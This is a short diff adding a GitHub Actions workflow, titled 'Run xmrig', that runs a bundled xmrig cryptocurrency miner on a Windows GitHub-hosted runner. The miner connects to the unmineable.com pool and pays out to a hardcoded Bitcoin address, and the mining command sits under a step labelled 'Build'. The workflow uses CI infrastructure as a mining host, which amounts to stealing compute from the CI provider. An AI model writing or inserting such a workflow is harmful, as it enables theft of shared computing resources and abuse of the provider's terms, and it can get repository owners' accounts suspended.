@@ -1,0 +1,13 @@
+name: Run xmrig 
+on:
+ workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+        - uses: actions/checkout@v2
+        - name: Build
+          run: | 
+                ${{ github.workspace }}/xmrig-win/xmrig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u BTC:bc1qwh4646ppd8dpj6fsd00mr9g6jeqd78jggcdntg.my_workerpublic#Bitcoin-Tips -p x 
+                pause
